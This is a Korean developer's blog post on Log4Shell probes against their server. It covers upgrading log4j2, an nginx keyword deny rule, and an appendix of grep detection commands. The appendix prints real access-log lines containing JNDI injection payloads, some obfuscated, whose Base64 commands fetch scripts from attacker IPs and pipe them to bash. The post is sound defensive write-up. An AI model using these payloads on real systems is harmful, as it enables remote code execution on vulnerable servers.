+&lt;h2 id=&quot;어떻게-공격이-들어오는가&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%96%B4%EB%96%BB%EA%B2%8C-%EA%B3%B5%EA%B2%A9%EC%9D%B4-%EB%93%A4%EC%96%B4%EC%98%A4%EB%8A%94%EA%B0%80&quot; aria-label=&quot;어떻게 공격이 들어오는가 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;어떻게 공격이 들어오는가?&lt;/h2&gt;
+&lt;p&gt;일단 불법적으로 들어오는 것들을 조사하는 로그 서버에서 이런 결과가 들어있었다.&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 1.6666666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAARElEQVQI1x2IwQ2AMAzEGCmKRJ80uYTSgth/nEPkYVn2dq2HyEGPZDfQPKoNwaMbc0w6koizfnfU+5n3y701ighVtfwBiwIi+pWP7aMAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img 01&quot;
+        title=&quot;img 01&quot;
+        src=&quot;/static/769b261384b168f466560382be26ccd4/c1b63/img_01.png&quot;
+        srcset=&quot;/static/769b261384b168f466560382be26ccd4/5a46d/img_01.png 300w,
+/static/769b261384b168f466560382be26ccd4/0a47e/img_01.png 600w,
+/static/769b261384b168f466560382be26ccd4/c1b63/img_01.png 1200w,
+/static/769b261384b168f466560382be26ccd4/07e9f/img_01.png 1301w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;
+&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 1.6666666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAPklEQVQI1zWKyQ3AMAzDupKN5unb3X8kJU2QFyFSj6jBo+DZm2IOi0RU42+iZ+vy1+1vFmIx+8M7BogIzIwJcMoilUBNeHUAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img 02&quot;
+        title=&quot;img 02&quot;
+        src=&quot;/static/aec2f20ca53fea94b29439398a0b85e9/c1b63/img_02.png&quot;
+        srcset=&quot;/static/aec2f20ca53fea94b29439398a0b85e9/5a46d/img_02.png 300w,
+/static/aec2f20ca53fea94b29439398a0b85e9/0a47e/img_02.png 600w,
+/static/aec2f20ca53fea94b29439398a0b85e9/c1b63/img_02.png 1200w,
+/static/aec2f20ca53fea94b29439398a0b85e9/d0ab7/img_02.png 1532w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;동작 방식은 사실 대충 알고, 자세하게 동작하는 방식은 &lt;strong&gt;&lt;a href=&quot;https://www.popit.kr/log4j-%EB%B3%B4%EC%95%88-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%8F%99%EC%9E%91%EC%9B%90%EB%A6%AC-%EB%B0%8F-jenkins-%EC%84%9C%EB%B2%84-%ED%99%95%EC%9D%B8-%EB%B0%A9%EB%B2%95/&quot;&gt;popit&lt;/a&gt;&lt;/strong&gt; 게시글을 참고하자.&lt;br&gt;
+(여담인데 난 원리까진 모르고 어떻게만 공격해서 들어오는지 까지만 알기에… 공격 기법이나 원리에 대한 설명은 무지해서 적을 수 없다…)&lt;/p&gt;
+&lt;p&gt;내가 이해한 바로는 log.info 나 log.warn() 등을 통해 로깅을 할 때 메세지에 다음과 같이 적을 때 발생한다.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;log.error(“Req Access UA : ” + req.getHeader(“X-Api-Version”) );&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;위는 예시이다.&lt;br&gt;
+저런식으로 로그를 남기게 해서 공격자의 코드를 수행할 수 있게 한다는거 같다&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;jandi:ldap://공격자-ip/http443path&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;위 사진을 보면 알겠지만 저렇게 ldap 뒤에 공격자의 주소를 넣어서 처리하는 식으로 들어온다.&lt;/p&gt;
+&lt;br&gt;
+&lt;h2 id=&quot;그래서-어떻게-처리했는가&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EA%B7%B8%EB%9E%98%EC%84%9C-%EC%96%B4%EB%96%BB%EA%B2%8C-%EC%B2%98%EB%A6%AC%ED%96%88%EB%8A%94%EA%B0%80&quot; aria-label=&quot;그래서 어떻게 처리했는가 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;그래서 어떻게 처리했는가?&lt;/h2&gt;
+&lt;p&gt;뭐 별거 없다.&lt;br&gt;
+그냥 log4j 버전업을 했다.&lt;br&gt;
+사진을 못찍었는데 나의 경우 spring boot starter 의 logging 이었나 이게 2.11 버전을 쓰고 있었다.&lt;/p&gt;
+&lt;p&gt;그래서 그냥 버전을 올렸다.&lt;br&gt;
+&lt;strong&gt;Gradle&lt;/strong&gt; 을 사용하는데 아래와 같이 한줄 넣어줬다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;gradle&quot;&gt;&lt;pre class=&quot;language-gradle&quot;&gt;&lt;code class=&quot;language-gradle&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;...&lt;/span&gt;
+ext&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;log4j2.version&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;2.15.0&apos;&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;dependencies&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;....&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;....&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;위와 같이 한줄 넣고 gradle을 새로 받아오니 log4j의 버전이 2.15로 되었다.&lt;br&gt;
+이렇게 대응이 완료되었다… ㅡ,.ㅡ;;&lt;/p&gt;
+&lt;p&gt;그리고…이건 공격 대응이 될지 모르겠지만…&lt;br&gt;
+nginx 앞단에서 특정 키워드로 접근하는 것을 막는 부분에 다음과 같이 추가해줬다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;...
+	~*(j_spring_security_check|wps|cgi|asmx|jndi|dns|securityscan|ldap) 1;
+...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;이렇게 하면 서비스 접근 전에 nginx에서 컷 시킬수 있지 않을까 싶다. (안될수도?)&lt;br&gt;
+근데 이렇게 하니 로그 서버에 저런 비 정상적인 접근은 더 이상 들어오지 않았다.&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 563px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 16.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAfUlEQVQI132OSw7CMAxEeyPyEyWhTRwnLXD/Aw22N0gIsZiFx+PnWfbaEEKA9/6HAra9gucJ4gHqw/wYI+b5RG0d1/UG55zoYrvlP9B/gAJrIj1WIPHEOB4CfgmYLGdAHTSg0G+prw95HAakzuanlKxhzgWrNCz3DbkU270BnlljPbEqmJAAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img 03&quot;
+        title=&quot;img 03&quot;
+        src=&quot;/static/4225f2521cd918169f91b37e67f46deb/7cb89/img_03.png&quot;
+        srcset=&quot;/static/4225f2521cd918169f91b37e67f46deb/5a46d/img_03.png 300w,
+/static/4225f2521cd918169f91b37e67f46deb/7cb89/img_03.png 563w&quot;
+        sizes=&quot;(max-width: 563px) 100vw, 563px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;단지 위와 같이 무지성으로 대입해서 들어오는 것들이 많을 뿐…&lt;/p&gt;
+&lt;p&gt;그리고 하단의 참고 항목을 보면 Cisco talos 차단 권고 항목에 ip가 있다.&lt;br&gt;
+여기에 등록된 ip 전부 밴 처리 해뒀다.&lt;/p&gt;
+&lt;br&gt;
+&lt;h2 id=&quot;정리-및-참고-그리고-부록&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%A0%95%EB%A6%AC-%EB%B0%8F-%EC%B0%B8%EA%B3%A0-%EA%B7%B8%EB%A6%AC%EA%B3%A0-%EB%B6%80%EB%A1%9D&quot; aria-label=&quot;정리 및 참고 그리고 부록 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;정리 및 참고 그리고 부록…&lt;/h2&gt;
+&lt;h3 id=&quot;정리&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%A0%95%EB%A6%AC&quot; aria-label=&quot;정리 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;정리&lt;/h3&gt;
+&lt;p&gt;근데 개인적인 생각인데 User Agent 를 로깅 안하면 영향은 없지 않을까? (개인적 무지성 판단…)&lt;br&gt;
+얼른 대응해서 큰 피해 안나게 조심하자…&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 id=&quot;참고&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%B0%B8%EA%B3%A0&quot; aria-label=&quot;참고 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;참고&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://labrador.iotcube.com&quot;&gt;래브라도 취약점 점검 도구-한글&lt;/a&gt;&lt;br&gt;
+&lt;a href=&quot;https://blog.lgcns.com/2740&quot;&gt;LG CNS의 차단 대응 및 안내 -한글&lt;/a&gt;&lt;br&gt;
+&lt;a href=&quot;https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot&quot;&gt;Spring 공식 레퍼런스 대응 -영문&lt;/a&gt;&lt;br&gt;
+&lt;a href=&quot;https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b&quot;&gt;Log4J 악용탐지-영문&lt;/a&gt;&lt;br&gt;
+&lt;a href=&quot;https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html&quot;&gt;Cisco talos 차단 권고-영문&lt;/a&gt;&lt;/p&gt;
+&lt;br&gt;
+ 
+### 부록 - 악용탐지
+&lt;p&gt;위의 참고 중에 악용 탐지 gist 항목을 보면…&lt;br&gt;
+&lt;strong&gt;/var/log 폴더 및 모든 하위 폴더의 압축되지 않은 파일에서 악용 시도&lt;/strong&gt; 에 대한 검색을 할 수 있는 grep 명령어를 제공한다.&lt;/p&gt;
+&lt;p&gt;한번 돌려봤다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;fuck-hack@ip-999-444-999-444:~$ sudo egrep -I -i -r &apos;\$(\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\n]+&apos; /var/log
+/var/log/nginx/access.log.1:51.89.237.81 - - [13/Dec/2021:04:28:09 +0900] &quot;GET /$%7Bjndi:ldap://79.172.214.11:1389/Basic/Command/Base64/Y3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA==%7D HTTP/1.0&quot; 404 162 &quot;-&quot; &quot;mozila&quot;
+/var/log/nginx/access.log.1:45.83.67.182 - - [13/Dec/2021:12:37:28 +0900] &quot;GET /$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D HTTP/1.1&quot; 404 134 &quot;${jndi:dns://45.83.64.1/securityscan-http80}&quot; &quot;${jndi:dns://45.83.64.1/securityscan-http80}&quot;
+/var/log/nginx/access.log.1:45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] &quot;GET /$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D HTTP/1.1&quot; 302 0 &quot;${jndi:dns://45.83.64.1/securityscan-https443}&quot; &quot;${jndi:dns://45.83.64.1/securityscan-https443}&quot;
+/var/log/nginx/access.log.1:45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] &quot;GET / HTTP/1.1&quot; 200 7587 &quot;${jndi:dns://45.83.64.1/securityscan-https443}&quot; &quot;${jndi:dns://45.83.64.1/securityscan-https443}&quot;
+/var/log/nginx/access.log.1:195.54.160.149 - - [13/Dec/2021:13:45:17 +0900] &quot;GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo} HTTP/1.1&quot; 200 396 &quot;${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}&quot; &quot;${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}&quot;
+/var/log/nginx/access.log.1:167.172.44.255 - - [13/Dec/2021:20:45:05 +0900] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;borchuk/3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClass}&quot;
+
+=====
+
+fuck-hack@ip-999-444-999-444:~$ sudo find /var/log -name \*.gz -print0 | xargs -0 zgrep -E -i &apos;\$(\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\n]+&apos;
+/var/log/nginx/access.log.3.gz:45.155.205.233 - - [11/Dec/2021:03:21:49 +0900] &quot;GET / HTTP/1.1&quot; 200 396 &quot;-&quot; &quot;${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}&quot;
+/var/log/nginx/access.log.3.gz:1.116.59.211 - - [11/Dec/2021:19:13:15 +0900] &quot;GET /${jndi:ldap://45.130.229.168:1389/Exploit} HTTP/1.1&quot; 404 162 &quot;-&quot; &quot;curl/7.58.0&quot;
+/var/log/nginx/access.log.3.gz:195.251.41.139 - - [11/Dec/2021:21:13:15 +0900] &quot;GET / HTTP/1.1&quot; 200 396 &quot;-&quot; &quot;/${jndi:ldap://45.130.229.168:1389/Exploit}&quot;
+/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:02:26:12 +0900] &quot;GET / HTTP/1.1&quot; 200 7417 &quot;-&quot; &quot;${jndi:ldap://http443useragent.kryptoslogic-cve-2021-44228.com/http443useragent}&quot;
+/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:04:03:54 +0900] &quot;GET /$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D HTTP/1.1&quot; 302 0 &quot;-&quot; &quot;Kryptos Logic Telltale&quot;
+/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:04:03:54 +0900] &quot;GET / HTTP/1.1&quot; 200 7418 &quot;https://3.36.159.204/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D&quot; &quot;Kryptos Logic Telltale&quot;
+/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:08:26:47 +0900] &quot;GET / HTTP/1.1&quot; 200 396 &quot;-&quot; &quot;${jndi:ldap://http80useragent.kryptoslogic-cve-2021-44228.com/http80useragent}&quot;
+/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:09:42:21 +0900] &quot;GET /$%7Bjndi:ldap://http80path.kryptoslogic-cve-2021-44228.com/http80path%7D HTTP/1.1&quot; 404 134 &quot;-&quot; &quot;Kryptos Logic Telltale&quot;
+/var/log/nginx/access.log.2.gz:45.155.204.20 - - [12/Dec/2021:10:01:33 +0900] &quot;GET /?x=${jndi:ldap://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com/a} HTTP/1.1&quot; 400 800 &quot;${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com}&quot; &quot;${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com}&quot;
+/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:02:36:55 +0900] &quot;POST /?&amp;amp;token=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;amp;sign=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;amp;username=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;amp;password=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;amp;error=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;amp;apikey=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;amp;key=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D HTTP/1.1&quot; 405 0 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36&quot;
+/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] &quot;POST /api?&amp;amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1&quot; 302 0 &quot;-&quot; &quot;${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}&quot;
+/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] &quot;GET / HTTP/1.1&quot; 200 7637 &quot;-&quot; &quot;${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}&quot;
+/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] &quot;GET /api?&amp;amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1&quot; 302 0 &quot;-&quot; &quot;${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}&quot;
+/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] &quot;GET / HTTP/1.1&quot; 200 7635 &quot;-&quot; &quot;${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}&quot;
+/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] &quot;PUT /api?&amp;amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1&quot; 302 0 &quot;-&quot; &quot;${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}&quot;
+/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] &quot;GET / HTTP/1.1&quot; 200 7635 &quot;-&quot; &quot;${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}&quot;
+/var/log/nginx/access.log.4.gz:45.155.205.233 - - [10/Dec/2021:22:31:20 +0900] &quot;GET / HTTP/1.1&quot; 200 396 &quot;-&quot; &quot;${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}&quot;
+/var/log/nginx/access.log.4.gz:45.155.205.233 - - [10/Dec/2021:23:27:05 +0900] &quot;GET / HTTP/1.1&quot; 200 7669 &quot;-&quot; &quot;${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6NDQzfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzMuMzYuMTU5LjIwNDo0NDMpfGJhc2g=}&quot;
+
+====
+
+fuck-hack@ip-999-444-999-444:~$ sudo find /var/log/ -type f -exec sh -c &quot;cat {} | sed -e &apos;s/\${lower://&apos;g | tr -d &apos;}&apos; | egrep -I -i &apos;jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):&apos;&quot; \;
